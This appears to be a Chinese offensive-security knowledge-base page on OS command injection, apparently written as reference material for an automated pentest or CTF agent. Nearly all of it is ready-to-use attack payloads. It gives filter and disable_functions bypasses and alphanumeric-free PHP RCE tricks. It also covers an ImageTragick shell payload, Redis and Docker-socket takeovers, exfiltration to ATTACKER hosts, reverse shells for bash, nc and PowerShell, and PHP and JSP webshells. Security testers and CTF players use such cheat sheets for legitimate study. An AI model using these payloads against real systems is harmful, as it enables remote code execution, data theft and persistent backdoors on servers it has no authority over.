# OS 命令注入专题

> 元字符与上下文变体、盲检测、过滤绕过、disable_functions 绕过、组件级注入、容器/环境变量注入、反弹 shell。
> 相邻主题：SSTI/表达式注入见 `$AGENT_DIR/knowledge-base/ssti.md`；上传链见 web-vulnerabilities.md §4。

---

## 1. 元字符与危险代码模式

| 元字符 | 行为 |
|---|---|
| `;` | 顺序执行（不管前条） |
| `\|` / `\|\|` | 管道 / 前条失败才执行 |
| `&` / `&&` | 后台（Windows 顺序）/ 前条成功才执行 |
| `$(cmd)` / `` `cmd` `` | 命令替换 |
| `>` / `>>` / `<` | 重定向写/追加/读 |
| `%0a` / `%0d%0a` | 换行 / CRLF |

**危险模式**：PHP `shell_exec("cmd ".$x)`/`system()`/`exec()`/`passthru()`；Python `subprocess.call(..., shell=True)`（关键）/`os.system`/`os.popen`；Node `child_process.exec()`（走 shell，execFile 不走）；Perl `system()` 拼接；ASP `WScript.Shell Run` 拼接。

**上下文变体**：双引号内注入 `"; id ;`｜单引号内 `'; id;`｜反引号内 `` x`; id ;` ``｜路径上下文 `../../../etc/passwd`（穿越）或 `access.log; id`（注入）。

## 2. 盲检测与跨平台

**时间盲**：Linux `; sleep 5`（变体 `|`/`$()`/`` ` ``包裹）；Windows `& timeout /T 5 /NOBREAK`、`& ping -n 5 127.0.0.1`、`& waitfor /T 5 signal777`。条件延时：`if [ $(whoami) = "root" ]; then sleep 5; fi`。

**跨平台 polyglot**：`;sleep${IFS}5;#&timeout /T 5 /NOBREAK&#`。

**OOB**：DNS `; nslookup TOKEN.collab`、`; host \`whoami\`.collab`、Windows `& nslookup %USERNAME%.collab`；HTTP `; curl http://collab/\`whoami\``；文件回写 `; id > /var/www/html/RAND.txt` 后访问。整文件外带 `wget --post-file /flag ATTACKER:PORT`（免命令替换、二进制安全）; DNS 通道编码局限: 子域仅许 hex（base64 的 `=` 非法）且长度限制只带得动尾段——能回连优先 HTTP/反弹。

**cmd vs PowerShell**：

| 特性 | cmd.exe | PowerShell |
|---|---|---|
| 分隔符 | `&` `&&` `\|\|` | `;` `\|` `&` |
| 变量 | `%VAR%` / `!VAR!`（延迟） | `$env:VAR` |
| 转义 | `^`（`w^h^o^a^m^i` 拆关键字） | `` ` `` |
| 替换 | `FOR /F` | `$(...)` |
| 编码执行 | — | `-EncodedCommand`（UTF-16LE base64） |

PS 混淆：`$a='who';$b='ami';iex "$a$b"`、`& (gcm *ke-*)`、`IEX (New-Object Net.WebClient).DownloadString(...)`、`-Version 2` 绕受限语言模式。

## 3. 过滤绕过

**空格**：`cat</etc/passwd`｜`{cat,/etc/passwd}`（brace）｜`cat$IFS/etc/passwd`｜`X=$'\x20'&&cat${X}/...`。
**斜杠**：`$'\057'`（八进制）｜glob：`/???/??t /???/p??s??` = `/bin/cat /etc/passwd`、`cat /e?c/p?sswd`｜环境变量切片 `${PATH:0:1}`/`${PWD:0:1}`/`${HOME:0:1}`/`${SHELL:0:1}`（bash 变量展开取 / ，`${PATH:4:1}` 等偏移视具体 PATH 而定）｜**只放行大写字母时负索引拼命令**（数字全禁）: `${PATH:~A}${PWD:~A} ????.???` 拼出 `nl`（~A=-1 取尾字符; PATH 尾 /bin→n、PWD=/var/www/html→l; 数字偏移用 `${#VAR}` 长度展开替代: `${HOME:${#HOSTNAME}:${#SHLVL}}`=t）——先 `echo $PATH` 探测再构造。
**关键字**：变量拼接 `a=c;b=at;$a$b`｜`c${x}at`（未定义变量插空）｜`%0a` 换行。
**cat 替代**：`tac`/`nl`/`head`/`tail`/`more`/`less`/`sort`/`uniq`/`rev|rev`/`xxd`/`strings`/`od -c`/`base64`。**> 被滤时输出落盘**：`ls|tee flag`（tee 双写: `tee a b` 复制、`cmd|tee file` 落盘同时回显——无回显 RCE 写文件查看的首选）。

**eval 长度限制**: `echo\`cat *\`` 12 字符; `` `$_GET[0]` `` 11 字符参数化（payload 全放 URL 参数，数字参数名免引号，长度限制失效）｜**substr($F,0,6) 硬截断逃逸**: payload 前缀 `` `$F `` +空格（凑满 6 字符）——eval(`` `$F `;``) 反引号内 $F 展开**完整原始值**（含截断丢弃部分）当命令执行（`` ` ``=shell_exec），空格垫位使分号不进前 6 字符，`?F=`$F `;cp flag.php 1.txt` 型（无回显 RCE，tee/curl 外带/盲注配套）。
**形态校验绕过**: 递归正则只验"函数名(参数)"形态时 `eval(current(getallheaders()));` + 请求头夹带真 payload——同类: get_defined_vars/file_get_contents('php://input')/current($_SERVER)。
**Ruby 黑名单绕过**: File.read→Kernel#open; system/exec→`open('|cmd')`/`%x[cmd]`/Process.spawn; instance_eval 注入 `valid');PAYLOAD#`。沙箱拦变量时 ObjectSpace.each_object(String) 按前缀扫全堆; 私有方法 send(:m)/method(:m).call。
**Perl 2 参数 open()**: 文件名内 | 前后缀即执行——`open(FH, "|cmd")`（legacy CGI 高频）。
**异构语言**: Progoal `,` 链目标 `3), exec(cat('/flag'))`（exec/1、shell/1、process_create/3）; Lisp read 求值 `#.(run-shell-command "cmd")` reader 宏——安全必须 read-line。
**元数据/文件名进 shell**: exiftool -ImageDescription="x ; cmd" 上传即注（identify/ffprobe 同理）; tar 成员名 `name; cat /flag #`——解压链每环节测结构字符。
**date -f 读文件**: GNU date -f /flag 的报错逐行含文件内容——命令参数可控时枚举 -f 类标志。
**ReDoS 攻击性利用**: ①用户正则匹配文件→`(a+)+$` 尾失配全回溯作逐字符 timing oracle（配路径穿越打 /proc/1/environ）; ②PHP preg_match 超时返 false→ACL INSERT 被跳过→无记录=无限制（pcre.backtrack_limit=100 万）。
**disable_functions 时文件系统函数兜底**: scandir('/')/glob('/flag*')/file_get_contents/readfile/getenv('FLAG')/get_defined_vars()——先枚举随机化文件名再读（ini_get 确认两个限制项）｜**文件函数也全禁时 PDO 兜底**: 本地 MySQL 凭据可得时 `new PDO('mysql:host=localhost;dbname=x','root','root')` → `query('select load_file("/flag")')` 逐行取 $row[0]（需 FILE 权限+secure_file_priv 允许）。
**eval 输出被后处理时 exit 截断**（`ob_get_contents()+ob_end_clean()+preg_replace` 替换字母数字场景）: payload 尾加 `exit();` 在后处理前终止——`require("/flag.txt");exit();` 输出直接冲刷，绕过输出替换；一切"先执行用户代码再统一处理输出"结构同适用。
**PHP 层**：注释插入 `sys/*x*/tem('id')`（eval 上下文）｜XOR 逐字符构造 `('%01'^'`')...` 拼 assert｜`base64_decode('c3lzdGVt')('id')`｜hex 变体 `hex2bin('73797374656d')('cat index.php')`｜`str_rot13('flfgrz')`｜`chr(115).chr(121)...`｜`strrev('metsys')`｜拼接 `'sys'.'tem'`。

**无字母数字 RCE 四法**（preg_match '/[a-z0-9]/i' 全禁场景，php7 首选取反）:
1. **取反**: `(~%8c%86%8c%8b%9a%92)(~%93%8c);` = system('ls')——urlencode(~func) 构造器双段（函数名+参数各取反），php7 最短
2. **异或/或**: 两个不可见字符 URL 串逐位 `^` 或 `|` 出可见字符——`("%08%02%08%08%05%0d"^"%7b%7b%7b%7c%60%60")("...")`; 脚本: 遍历 0-255 对两字符组按题目正则过滤后建 "目标字符→(a,b)" 映射表再拼接（or 法对 `/[b-df-km-uw-z]/` 类留洞正则尤佳）
3. **自增**: `$_=[];$_=@"$_";` 得 'Array'，首字母 A 经 `$__++` 逐增拼出 ASSERT/POST（`$_=$_['!'=='@']` 取首字符; php<7.0.12 可用，version-sensitive）
4. **UTF-8 汉字取反**: `'和'{2}`="\x8c" 取反得字母——汉字串当字符库（php5 webshell 常用）
**临时文件 glob 执行**（system 类+字母数字全禁）: POST 上传任意文件→`. /???/????????[@-[]`——`[@-[]`=ASCII @-[ 区间=大写字母（/tmp/phpXXXXXX 尾字符必大写概率高，PHP 临时文件名全小写目录中唯一含大写）; `.`=source 免 x 权限; 连发重试
**bash 无变量名构数**（字母数字全禁、变量名不可用时）: `$(())`=0、`$((~$(())))`=-1（取反）、两 -1 拼接再取反=1；构造 N=N+1 个 `$((~$(())))` 并列后整体取反——`$((~$(( $((~$(())))×37 ))))`=36
**gettext `_()` 单字符函数**（字母全禁但 `_` 放行）: `call_user_func(call_user_func('_','get_defined_vars'))`——`_()` gettext 别名原样回显参数串当函数名跳板；配套数组传参 `ctfshow[0]=ctfshow&ctfshow[1]=getFlag` 调静态方法绕封号检测
**eval return 表达式包裹**（`eval("return $v1$v3$v2;")` 型，v1/v2 限数字、v3 限符号）: payload 前后包裹算术运算符使其成子表达式——`v3=*("异或串")("参数串")*` 或 `|(~取反串)(~参数串)|`，可用包裹符 fuzz（`*`/`+`/`-`/`|` 按过滤集选）
**超短长度限制（4-7 字符）分段写**: `>\`+命令片段 逐个创建文件名（倒序: `>ag`>l\\>ca\\ 造出 cat）→`ls -t>y`（按时间序写脚本）→`. y` 执行——长度 4 时 IP 转 16 进制缩短; curl|bash 两段式最省（vps 放 payload）
**无参数 RCE**（`preg_replace('/[^\W]+\((?R)?\)/','',$_GET['code'])===';'` 校验）: 只许 a(b(c())) 形态、参数必须无字面量——数据源四通道: `getallheaders()`（apache; `eval(pos(...))`+自定义头放 payload）｜`get_defined_vars()`（通用; `eval(next(current(...)))`+GET 参数; 全局过滤时改 `$_FILES` 上传字段名当 payload）｜`session_id(session_start())`（`eval(hex2bin(...))`+PHPSESSID 放 hex——文件 session 只许 a-zA-Z0-9,-）｜`getenv()`（php≥7.1 免参+variables_order=EGPCS）。目录遍历链: `current(localeconv())`='.'→`scandir('.')`→`array_reverse`/`end`/`next` 取目标→`show_source/readfile`; 无 localeconv 时 `chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))` 数学链算出 '.'; 上跳 `dirname(getcwd())`/根目录 `scandir(chr(ord(strrev(crypt(serialize(array())))))` 撞 '.' 概率)

## 4. PHP disable_functions 绕过

system/exec/shell_exec/passthru/popen/proc_open 全禁时：

| 路径 | 要点 |
|---|---|
| LD_PRELOAD+mail | `putenv("LD_PRELOAD=/tmp/evil.so"); mail(...)` → sendmail 外部进程加载 .so 构造函数 |
| Shellshock (CVE-2014-6271) | `putenv("X=() { :; }; /usr/bin/id > /tmp/out"); mail(...)` |
| mod_cgi | 写 `.htaccess`（+ExecCGI）+ CGI 脚本 |
| PHP-FPM | socket 可达（9000//var/run/php-fpm.sock）时发 FastCGI 请求改 `PHP_VALUE=auto_prepend_file`（工具 phuip-fpizdam） |
| COM（Windows） | `new COM('WScript.Shell')` → Run/exec + StdOut 取回显 |
| ImageTragick (CVE-2016-3714) | 见 §5 |
| iconv (CVE-2024-2961) | `php://filter/convert.iconv` glibc 溢出 |
| proc_open/pcntl_exec | 若未禁：`proc_open('bash -i >& ...')`；`pcntl_exec('/bin/bash',['-c',...])` |
| FFI | `FFI::cdef` + libc（扩展启用时） |

**危险函数分级**：L1 代码执行 `eval/assert/create_function`（极危）→ L2 Shell `system/passthru/shell_exec`（高危）→ L3 进程 `exec/popen/proc_open`（中危）→ L4 回调 `call_user_func*`。
**assert 差异**：5.x 执行代码字符串；7.x 仅表达式；8.x 移除字符串参数。**preg_replace /e**（仅 5.x）：replacement 作 PHP 代码执行。

## 5. 组件级注入

**ImageMagick ImageTragick (CVE-2016-3714)**——处理上传图片时 MVG/SVG 内嵌：
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://x.com/x.jpg"|bash -i >& /dev/tcp/ATTACKER/PORT 0>&1 &")'
pop graphic-context
```
或 `convert '|id' out.png`。

**FFmpeg concat 读文件**：上传 .m3u8：`concat:http://attacker.com/header.txt|file:///etc/passwd`。

**Elasticsearch Groovy**（1.x 默认开，pre-5.x）：`POST /_search {"script_fields":{"exp":{"script":"...forName(\"java.lang.Runtime\")...exec(\"id\")..."}}}`。

**tar 文件名注入**：`touch 'name; cat /flag #' && tar cf exploit.tar *`。

**正则缺 `$`**：`/^\d+\.\d+\.\d+\.\d+/`（无 $）→ `127.0.0.1; cat /flag.txt` 前缀匹配放行。

**Redis 未授权**：写 SSH 公钥（`config set dir /root/.ssh` + `dbfilename authorized_keys` + `set x "\n\nssh-rsa ...\n\n"` + save）或写 crontab 反弹（dir /var/spool/cron + dbfilename root）。

**ThinkPHP 5.x RCE**：`POST /index.php?s=captcha`，body `_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=whoami`（变量覆盖→call_user_func）。

**入口统计**（WooYun 6826 案例）：文件操作 68%｜exec 族 62%｜Struts2 50%｜压缩解压 30%｜SSRF 30%｜ping 类 26%｜图片处理 24%。入口清单：ping/nslookup 诊断页、格式转换、邮件发件人、搜索排序传 grep/find/sort、日志查看、"运行测试"/CI hook、备份路径、zip/tar 文件名。

## 6. 容器/K8s + 环境变量

**kubectl/docker exec 注入**：POD_NAME=`mypod -- /bin/sh -c whoami #`；容器名=`web_app -u root web_app`（提 root）；命令参数闭引号插命令。

**未认证 API**：Docker socket（2375/2376//var/run/docker.sock）`POST /containers/create {"Cmd":[...],"Binds":["/:/host"]}` → start → exec；K8s（6443/8443）`POST /api/v1/namespaces/default/pods/{name}/exec?command=...`。

**编排 sink**：CI/CD 构建参数、K8s CronJob `.spec.containers[].command`、Helm values `{{ }}` 模板、Portainer/Rancher UI。

**环境变量隐式执行**：

| Linux | 效果 |
|---|---|
| `LD_PRELOAD` / `LD_LIBRARY_PATH` | 进程启动加载/库路径劫持 |
| `BASH_ENV` / `ENV` | 非交互 bash/POSIX sh 启动 source——system()/popen() 都触发 |
| `PROMPT_COMMAND` / `PS1` | 提示符前执行 / `$()` 展开 |
| `PYTHONSTARTUP` / `PERL5OPT` / `NODE_OPTIONS` / `RUBYOPT` | 解释器启动加载/-M 注入/--require/-r 注入 |

Windows：`COMSPEC`（system() 调用）、`PATH`（顺序劫持）、`PSModulePath`（自动加载模块）。场景：`NODE_OPTIONS="--require=/tmp/rs.js" node server.js`；Git `GIT_DIR` 指向带 hooks 的受控 repo。

## 7. 反弹 shell 与交互策略

**Linux**：bash `bash -i >& /dev/tcp/A/4444 0>&1`｜python3 socket+dup2 三连+`["/bin/sh","-i"]`｜nc 有 -e `nc A 4444 -e /bin/bash`｜nc 无 -e `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc A 4444 >/tmp/f`｜perl Socket 三 open。

**Windows PS**：`powershell -NoP -NonI -W Hidden -Exec Bypass -c "IEX (...DownloadString('http://A/shell.ps1'))"` 或 TCPClient+GetStream 循环 iex 回显。

**交互优先级**：直接回显 → 写 webshell（HTTP 交互）→ HTTP 回调外带（`curl http://A/?d=$(cmd|base64)`）→ 反弹 shell。

**tmux 手动交互**（无交互终端时）：`tmux new-session -d -s listener "nc -lvp 4444"` → 触发 → `capture-pane -t listener -p -S -100` 读屏 / `send-keys -t listener "id" Enter` 发命令。

**webshell 落盘**：`echo '<?php @eval($_POST["pass"]);?>' > shell.php`；隐蔽变体（拼接函数名写 .config.php、.htaccess 的 ErrorDocument 404 后门、include .config.jpg 自动加载）；JSP `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`。
